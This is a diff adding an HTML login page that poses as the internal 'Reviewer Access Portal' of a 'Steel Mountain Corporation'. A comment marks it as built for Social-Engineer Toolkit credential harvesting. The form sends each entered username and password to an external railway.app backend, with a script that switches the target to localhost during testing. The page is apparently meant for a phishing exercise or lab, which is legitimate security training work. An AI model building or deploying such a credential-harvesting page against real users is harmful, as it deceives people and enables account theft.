@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Steel Mountain Corporation - Reviewer Access Portal</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="login-page">
+    <div class="login-wrapper">
+        <div class="login-header">
+            <span class="brand-title">STEEL MOUNTAIN</span>
+            <span class="brand-subtitle">Manual Identity Verification Console</span>
+        </div>
+        
+        <div class="login-box">
+            <div class="login-box-title">System Authentication</div>
+            
+            <!-- Standard form submit for SET credential harvesting compatibility -->
+            <!-- Note: For local testing, change action to http://localhost:3000/api/website-a/login -->
+            <form id="login-form" method="POST" action="https://steelmountain-backend-production.up.railway.app/api/website-a/login">
+                <div class="form-group">
+                    <label for="username">Reviewer Username:</label>
+                    <input type="text" id="username" name="username" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Security Password:</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+
+                <div class="compliance-notice">
+                    <p><strong>Notice:</strong> This is a restricted, internal system. Access is subject to monitoring and audit logging under SM-SEC-808. Unauthorized login attempts are strictly prohibited.</p>
+                </div>
+                
+                <div class="form-actions">
+                    <button type="submit" class="btn btn-primary">Log In</button>
+                    <button type="reset" class="btn btn-secondary">Reset</button>
+                </div>
+            </form>
+
+            <div id="error-message" class="hidden error-box">
+                Authentication failed. Please verify credentials and security token.
+            </div>
+        </div>
+
+        <div class="browser-notice">
+            Recommended Browser: Internet Explorer 11 or Microsoft Edge. Screen resolution: 1024x768.
+        </div>
+    </div>
+
+    <div class="login-footer">
+        &copy; 2018 Steel Mountain Corporation. All rights reserved. | Internal Use Only
+    </div>
+
+    <script>
+        // Simple error display if redirected back with error parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error')) {
+            document.getElementById('error-message').classList.remove('hidden');
+        }
+
+        // Dynamically set form action to localhost when testing locally
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('login-form');
+            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                form.action = 'http://localhost:3000/api/website-a/login';
+            }
+        });
+    </script>
+</body>
+</html>
